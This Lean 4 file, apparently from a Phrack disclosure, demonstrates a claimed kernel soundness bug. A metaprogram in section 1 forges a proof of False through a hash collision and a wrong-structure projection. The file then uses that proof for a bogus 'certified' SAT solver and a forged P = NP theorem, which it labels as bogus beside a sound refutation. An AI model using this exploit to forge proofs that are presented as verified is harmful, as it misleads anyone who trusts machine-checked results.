import Lean
open Lean Elab Command

/-!
# P = NP — Forged Lean 4 Certificate

Exploits **CVE-2026-72844** (leanprover/lean4#14576): the kernel accepts
declarations with wrong-structure projections via expression hash collision,
allowing an axiom-free proof of `False`.

The complexity classes P and NP are defined via explicit deterministic
Turing machines.  An actual constant-time reject-all machine is shown
NOT to decide 3-SAT, before the kernel soundness exploit forges a proof
of the opposite.  A sound refutation and the forged certificate coexist
in the same file — that is the impact of kernel unsoundness.

Unlike the companion Rocq forgery (CVE-2026-72714), the Lean 4 exploit
yields `False` directly, so Cook–Levin is not needed as an axiom.
**The entire certificate — including P = NP — is fully axiom-free.**

- **Authors:** Jonathan Brossard (@endrazine), JP Aumasson (@veorq)
- **Part of:** "Owning the Truth" (Phrack)
- **CVE:** CVE-2026-72844
- **Affected:** Lean 4 through nightly-2026-07-27 (leanprover/lean4#14576)
-/

-- ============================================================================
-- § 1  CVE-2026-72844 — Kernel soundness exploit
--
-- The kernel incorrectly accepts a projection whose structure name does
-- not match the value being projected.  A metaprogram constructs such a
-- declaration via addDecl; the kernel checks and accepts it at trust=0.
-- From the unsound declaration we derive False — with zero axioms.
--
-- Original report: https://github.com/leanprover/lean4/issues/14576
-- ============================================================================

inductive P : Prop where | mk (b : Bool)
structure C where b : Bool
inductive W : Type where | mk (p : P)
inductive L (α : Type) (b : Bool) : Type where | mk
inductive T : Bool → Prop where | mk : T true

def pad (e : Expr) (n : Nat) : Expr :=
  mkApp (mkLambda `x .default (mkConst ``Nat) e) (.lit (.natVal n))

meta def build : CommandElabM Unit := do
  -- Construct two expressions with the same hash but different values
  let f := pad (mkConst ``Bool.false) 78670
  let t := pad (mkConst ``Bool.true) 24083
  unless f.hash == t.hash && f.approxDepth == t.approxDepth do
    throwError "hash collision failed — adjust padding constants for this Lean version"
  -- Build W values wrapping false and true
  let fw := mkApp (mkConst ``W.mk) (mkApp (mkConst ``P.mk) f)
  let tw := mkApp (mkConst ``W.mk) (mkApp (mkConst ``P.mk) t)
  -- Construct the unsound inductive E with a C-projection applied to a W
  let w := mkBVar 0
  let Ew := mkApp (mkConst `E) w
  let b := mkProj ``C 0 (mkProj ``C 0 w)  -- ← wrong-structure projection
  let l := mkApp2 (mkConst ``L) Ew b
  let Et := mkForall `w .default (mkConst ``W) (mkSort 1)
  let ct := mkForall `w .default (mkConst ``W) <|
    mkForall `l .default l (mkApp (mkConst `E) (mkBVar 1))
  liftCoreM <| addDecl <| .inductDecl [] 1 [{
    name := `E, type := Et, ctors := [{ name := `E.mk, type := ct }] }] false
  -- Build auxiliary definitions that exploit the type confusion
  let Et := mkApp (mkConst `E) tw
  let l := mkApp2 (mkConst ``L.mk) Et (mkConst ``Bool.true)
  liftCoreM <| addDecl <| .defnDecl {
    name := `e, levelParams := [], type := Et,
    value := mkApp2 (mkConst `E.mk) tw l,
    hints := .abbrev, safety := .safe }
  liftCoreM <| addDecl <| .defnDecl {
    name := `good', levelParams := [],
    type := mkApp (mkConst ``T) t, value := mkConst ``T.mk,
    hints := .abbrev, safety := .safe }
  let Ef := mkApp (mkConst `E) fw
  let Et := mkApp (mkConst `E) tw
  let a := mkApp2 (mkConst `E.mk) fw (mkProj `E 0 (mkConst `e))
  let tl := mkApp2 (mkConst ``L.mk) Et (mkConst ``Bool.true)
  let b := mkApp2 (mkConst `E.mk) tw tl
  let cT := mkApp2 (mkConst ``L) Et t
  let c := mkApp (mkLambda `l .default cT (mkConst ``Unit.unit)) tl
  let fl := mkApp2 (mkConst ``L.mk) Ef f
  let d := mkApp2 (mkConst `E.mk) fw fl
  -- Construct proof term that the kernel accepts despite type confusion
  let v := Expr.letE `a Ef a
    (.letE `b Et b
      (.letE `c (mkConst ``Unit) c
        (.letE `d Ef d (mkConst `good') true) true) true) true
  liftCoreM <| addDecl <| .thmDecl {
    name := `bad, levelParams := [],
    type := mkApp (mkConst ``T) f, value := v }

elab "exploit" : command => build

-- Fire the exploit: kernel accepts the unsound declaration
exploit

-- Derive False: T false has no constructors, but `bad` inhabits it
theorem boom : False := nomatch (bad : T false)

-- Confirm: no axioms involved in the exploit
#print axioms bad
#print axioms boom

-- ============================================================================
-- § 2  A concrete deterministic single-tape Turing-machine model
-- ============================================================================

namespace Complexity

/-- A binary string (word over {0,1}) -/
abbrev Word := List Bool

/-- A decision problem: a language over binary strings -/
def Language := Word → Prop

/-- Tape symbols: blank, a bit (0 or 1), and a separator for pair encoding -/
inductive Symbol where
  | blank | bit (b : Bool) | sep
  deriving BEq, DecidableEq

def encodeWord (x : Word) : List Symbol := x.map Symbol.bit

def encodePair (x cert : Word) : List Symbol :=
  encodeWord x ++ Symbol.sep :: encodeWord cert

/-- Head movement directions -/
inductive Direction where
  | left | stay | right

/-- A transition action: write a symbol, move the head, go to a state -/
structure Action where
  writeSymbol : Symbol
  moveHead    : Direction
  nextState   : Nat

/-- A transition rule: (source state, symbol read) ↦ action.
    The first matching rule wins. -/
structure Rule where
  sourceState : Nat
  readSymbol  : Symbol
  action      : Action

/-- A deterministic single-tape Turing machine.  Finite because its
    transition table is a list. -/
structure Machine where
  transitionTable : List Rule
  startState      : Nat
  acceptState     : Nat
  rejectState     : Nat

/-- Look up the first matching transition rule -/
def lookupRule (q : Nat) (s : Symbol) : List Rule → Option Action
  | [] => none
  | r :: tail =>
    if r.sourceState == q && r.readSymbol == s then some r.action
    else lookupRule q s tail

/-- A tape configuration.  `tapeLeft` is stored nearest-cell first;
    missing cells contain `Symbol.blank`. -/
structure Configuration where
  controlState : Nat
  tapeLeft     : List Symbol
  tapeHead     : Symbol
  tapeRight    : List Symbol

def initialConfiguration (M : Machine) (input : List Symbol) : Configuration :=
  match input with
  | [] => { controlState := M.startState,
            tapeLeft := [], tapeHead := .blank, tapeRight := [] }
  | h :: t => { controlState := M.startState,
                tapeLeft := [], tapeHead := h, tapeRight := t }

def move (d : Direction) (written : Symbol) (l r : List Symbol)
    : List Symbol × Symbol × List Symbol :=
  match d with
  | .stay => (l, written, r)
  | .left =>
    match l with
    | []     => ([], .blank, written :: r)
    | h :: t => (t, h, written :: r)
  | .right =>
    match r with
    | []     => (written :: l, .blank, [])
    | h :: t => (written :: l, h, t)

def step (M : Machine) (c : Configuration) : Option Configuration :=
  match lookupRule c.controlState c.tapeHead M.transitionTable with
  | none => none
  | some a =>
    let (l, h, r) := move a.moveHead a.writeSymbol c.tapeLeft c.tapeRight
    some { controlState := a.nextState,
           tapeLeft := l, tapeHead := h, tapeRight := r }

def halted (M : Machine) (c : Configuration) : Option Bool :=
  if c.controlState == M.acceptState then some true
  else if c.controlState == M.rejectState then some false
  else none

/-- Run at most `fuel` transitions from configuration `c`. -/
def runFrom (M : Machine) : (fuel : Nat) → Configuration → Option Bool
  | 0, c =>
    match halted M c with
    | some answer => some answer
    | none => none
  | n + 1, c =>
    match halted M c with
    | some answer => some answer
    | none =>
      match step M c with
      | some c' => runFrom M n c'
      | none => none

def run (M : Machine) (input : List Symbol) (fuel : Nat) : Option Bool :=
  runFrom M fuel (initialConfiguration M input)

/-- A halted configuration returns its answer independently of fuel. -/
theorem runFrom_halted (M : Machine) (fuel : Nat) (c : Configuration)
    (answer : Bool) (h : halted M c = some answer) :
    runFrom M fuel c = some answer := by
  cases fuel <;> simp [runFrom, h]

/-- One step from the initial configuration to a halted state. -/
theorem runOneStepToHalted (M : Machine) (input : List Symbol) (fuel : Nat)
    (c' : Configuration) (answer : Bool)
    (hInit : halted M (initialConfiguration M input) = none)
    (hStep : step M (initialConfiguration M input) = some c')
    (hHalt : halted M c' = some answer) :
    run M input (fuel + 1) = some answer := by
  simp only [run, runFrom, hInit, hStep]
  exact runFrom_halted M fuel c' answer hHalt

-- ============================================================================
-- § 3  Polynomial time, P, and NP
-- ============================================================================

/-- `c * (n+1)^k` — avoids zero budget on empty inputs -/
def polynomialBound (c k n : Nat) : Nat := c * (n + 1) ^ k

def haltsWithin (M : Machine) (input : List Symbol) (fuel : Nat) : Prop :=
  ∃ answer : Bool, run M input fuel = some answer

def acceptsWithin (M : Machine) (input : List Symbol) (fuel : Nat) : Prop :=
  run M input fuel = some true

/-- A machine decides `lang` within one fixed polynomial bound. -/
def polynomialDecider (M : Machine) (lang : Language) : Prop :=
  ∃ c k : Nat, c > 0 ∧
    ∀ x : Word,
      haltsWithin M (encodeWord x) (polynomialBound c k x.length) ∧
      (acceptsWithin M (encodeWord x) (polynomialBound c k x.length) ↔ lang x)

/-- A language is in **P** iff it has a polynomial-time decider -/
def InP (lang : Language) : Prop :=
  ∃ M : Machine, polynomialDecider M lang

/-- A verifier must halt on every proposed certificate within a polynomial
    bound.  Accepted certificates themselves have a polynomial length
    bound in the instance length. -/
def polynomialVerifier (V : Machine) (lang : Language) : Prop :=
  ∃ tc tk cc ck : Nat, tc > 0 ∧ cc > 0 ∧
    (∀ x cert : Word,
      haltsWithin V (encodePair x cert)
        (polynomialBound tc tk (x.length + cert.length + 1))) ∧
    (∀ x : Word,
      lang x ↔ ∃ cert : Word,
        cert.length ≤ polynomialBound cc ck x.length ∧
        acceptsWithin V (encodePair x cert)
          (polynomialBound tc tk (x.length + cert.length + 1)))

/-- A language is in **NP** iff it has a polynomial-time verifier -/
def InNP (lang : Language) : Prop :=
  ∃ V : Machine, polynomialVerifier V lang

/-- The complexity class **P** -/
def P : Language → Prop := InP

/-- The complexity class **NP** -/
def NP : Language → Prop := InNP

/-- Equality of the two classes of binary languages -/
def P_eq_NP : Prop := ∀ lang : Language, InP lang ↔ InNP lang

def P_neq_NP : Prop := ¬ P_eq_NP

def NP_not_subset_P : Prop :=
  ∃ lang : Language, InNP lang ∧ ¬ InP lang

-- ============================================================================
-- § 4  3-SAT as a binary language
-- ============================================================================

/-- A variable identifier is a natural number.  `isPositive = true` denotes
    the positive literal; `isPositive = false` its negation. -/
structure Literal where
  varIdx     : Nat
  isPositive : Bool

abbrev Clause := List Literal

/-- The syntactic invariant permits clauses of length zero through three.
    The proof field is in Prop and is not part of the serialised input. -/
structure ThreeCNF where
  clauses : List Clause
  valid   : ∀ cl ∈ clauses, cl.length ≤ 3

abbrev Assignment := Nat → Bool

def evalLiteral (a : Assignment) (l : Literal) : Bool :=
  if l.isPositive then a l.varIdx else !a l.varIdx

def evalClause (a : Assignment) : Clause → Bool
  | []      => false
  | l :: ls => evalLiteral a l || evalClause a ls

def evalClauses (a : Assignment) : List Clause → Bool
  | []       => true
  | cl :: cs => evalClause a cl && evalClauses a cs

def satisfies (a : Assignment) (F : ThreeCNF) : Prop :=
  evalClauses a F.clauses = true

def satisfiable (F : ThreeCNF) : Prop :=
  ∃ a : Assignment, satisfies a F

-- Prefix-free binary encoding

/-- Encode a natural number: n ones followed by a zero (unary, prefix-free) -/
def encodeNat (n : Nat) : Word :=
  List.replicate n true ++ [false]

def encodeLiteral' (l : Literal) : Word :=
  l.isPositive :: encodeNat l.varIdx

def encodeLiterals : List Literal → Word
  | []      => []
  | l :: ls => encodeLiteral' l ++ encodeLiterals ls

/-- A clause starts with its length in unary, then its literals -/
def encodeClause' (cl : Clause) : Word :=
  List.replicate cl.length true ++ [false] ++ encodeLiterals cl

def encodeClauses' : List Clause → Word
  | []       => []
  | cl :: cs => encodeClause' cl ++ encodeClauses' cs

/-- A formula starts with its clause count, then the clauses -/
def encodeThreeCNF (F : ThreeCNF) : Word :=
  encodeNat F.clauses.length ++ encodeClauses' F.clauses

/-- Invalid binary encodings are not in the language. -/
def threeSatLanguage : Language :=
  fun x => ∃ F : ThreeCNF, encodeThreeCNF F = x ∧ satisfiable F

/-- The empty conjunction is satisfiable and belongs to 3-SAT. -/
def emptyThreeCNF : ThreeCNF where
  clauses := []
  valid   := fun _ h => nomatch h

theorem encodedEmptyFormulaIsSat :
    threeSatLanguage (encodeThreeCNF emptyThreeCNF) :=
  ⟨emptyThreeCNF, rfl, fun _ => false, rfl⟩

-- ============================================================================
-- § 5  A constant-time reject-all machine
--
-- An actual TM that rejects all binary inputs in one transition.  This
-- is a real constant-time machine in the same operational semantics
-- defining P, unlike a fuel-indexed Gallina function with arbitrary work.
-- ============================================================================

def rejectRule (s : Symbol) : Rule where
  sourceState := 0
  readSymbol  := s
  action      := { writeSymbol := s, moveHead := .stay, nextState := 2 }

def fakeSatMachine : Machine where
  transitionTable :=
    [rejectRule .blank, rejectRule (.bit false),
     rejectRule (.bit true), rejectRule .sep]
  startState  := 0
  acceptState := 1
  rejectState := 2

/-- Honest proof: the actual TM interpreter observes one transition,
    then halts in the rejecting state. -/
theorem fakeSolverReallyHaltsInConstantTime (x : Word) :
    run fakeSatMachine (encodeWord x)
      (polynomialBound 1 0 x.length) = some false := by
  cases x with
  | nil => rfl
  | cons b xs => cases b <;> rfl

/-- A genuine counterexample: the encoded empty CNF is satisfiable, but
    the reject-all machine rejects it. -/
theorem fakeSolverIsIncorrect :
    ¬ (∀ x : Word,
      acceptsWithin fakeSatMachine (encodeWord x)
        (polynomialBound 1 0 x.length) ↔ threeSatLanguage x) := by
  intro H
  have h := (H (encodeThreeCNF emptyThreeCNF)).mpr encodedEmptyFormulaIsSat
  unfold acceptsWithin at h
  rw [fakeSolverReallyHaltsInConstantTime] at h
  exact absurd h (by decide)

/-- The one-step rejection holds for any positive fuel budget. -/
theorem fakeSolverRejectsWithPositiveFuel (x : Word) (fuel : Nat)
    (h : 0 < fuel) :
    run fakeSatMachine (encodeWord x) fuel = some false := by
  match fuel, h with
  | n + 1, _ =>
    cases x with
    | nil =>
      exact runOneStepToHalted fakeSatMachine [] n _ false rfl rfl rfl
    | cons b xs =>
      cases b <;>
        exact runOneStepToHalted fakeSatMachine _ n _ false rfl rfl rfl

private theorem pow_pos_of_pos (b : Nat) (hb : 0 < b) : ∀ n, 0 < b ^ n
  | 0     => by simp
  | n + 1 => Nat.mul_pos (pow_pos_of_pos b hb n) hb

theorem polynomialBound_pos (c k n : Nat) (hc : 0 < c) :
    0 < polynomialBound c k n :=
  Nat.mul_pos hc (pow_pos_of_pos (n + 1) (Nat.succ_pos n) k)

/-- Sound refutation: the reject-all machine is NOT a polynomial decider
    for 3-SAT, regardless of the polynomial bound chosen. -/
theorem fakeSolverIsNotPolynomialDecider :
    ¬ polynomialDecider fakeSatMachine threeSatLanguage := by
  intro ⟨c, k, hc, hdecides⟩
  have ⟨_, hcorrect⟩ := hdecides (encodeThreeCNF emptyThreeCNF)
  have hsat := hcorrect.mpr encodedEmptyFormulaIsSat
  unfold acceptsWithin at hsat
  have hrej := fakeSolverRejectsWithPositiveFuel
    (encodeThreeCNF emptyThreeCNF)
    (polynomialBound c k (encodeThreeCNF emptyThreeCNF).length)
    (polynomialBound_pos c k (encodeThreeCNF emptyThreeCNF).length hc)
  rw [hrej] at hsat
  exact absurd hsat (by decide)

-- ============================================================================
-- § 6  Kernel-unsoundness demonstration
--
-- The real machine rejects every input in one transition.  The only
-- fabricated proposition is that its answers agree with 3-SAT — derived
-- from False via the kernel soundness exploit.
-- ============================================================================

/-- Forged correctness claim: derived from `boom : False`. -/
def bogusThreeSatCorrectness :
    ∀ x : Word,
      acceptsWithin fakeSatMachine (encodeWord x)
        (polynomialBound 1 0 x.length) ↔ threeSatLanguage x :=
  fun _ => False.elim boom

/-- A forged polynomial-decider certificate for the reject-all machine.
    Everything here except `bogusThreeSatCorrectness` is justified by the
    same concrete TM operational semantics that defines InP. -/
def bogusPolynomialDecider :
    polynomialDecider fakeSatMachine threeSatLanguage :=
  ⟨1, 0, by omega, fun x =>
    ⟨⟨false, fakeSolverReallyHaltsInConstantTime x⟩,
     bogusThreeSatCorrectness x⟩⟩

def SAT_in_P : Prop := InP threeSatLanguage

def bogus_SAT_in_P : SAT_in_P :=
  ⟨fakeSatMachine, bogusPolynomialDecider⟩

/-- A certified SAT solver bundles a machine with a proof of correctness. -/
structure CertifiedSatSolver where
  solverMachine              : Machine
  solverIsPolynomialDecider  : polynomialDecider solverMachine threeSatLanguage

def forgedSatSolver : CertifiedSatSolver where
  solverMachine             := fakeSatMachine
  solverIsPolynomialDecider := bogusPolynomialDecider

-- The sound contradiction and the forged certificate coexist.
-- This is the actual impact of kernel unsoundness; neither a hidden cost
-- function nor a fabricated SAT encoding is needed.
#check fakeSolverIsNotPolynomialDecider
#check bogusPolynomialDecider

-- ============================================================================
-- § 7  P = NP (axiom-free)
--
-- Unlike the Rocq companion (CVE-2026-72714), the Lean 4 exploit yields
-- False directly, so Cook–Levin (`SAT_in_P → P_eq_NP`) is not needed as
-- an axiom.  The entire certificate is fully axiom-free.
-- ============================================================================

theorem bogus_P_eq_NP : P_eq_NP := fun _ => False.elim boom

-- ============================================================================
-- § 8  Certificate verification
-- ============================================================================

-- Forged SAT solver certificate
#check @bogus_SAT_in_P
#print axioms bogus_SAT_in_P

-- Forged P = NP
#check @bogus_P_eq_NP
#print axioms bogus_P_eq_NP

-- Sound refutations (precede the exploit in the logical dependency order)
#print axioms fakeSolverReallyHaltsInConstantTime
#print axioms fakeSolverIsNotPolynomialDecider

-- The exploit chain
#print axioms bad
#print axioms boom

end Complexity
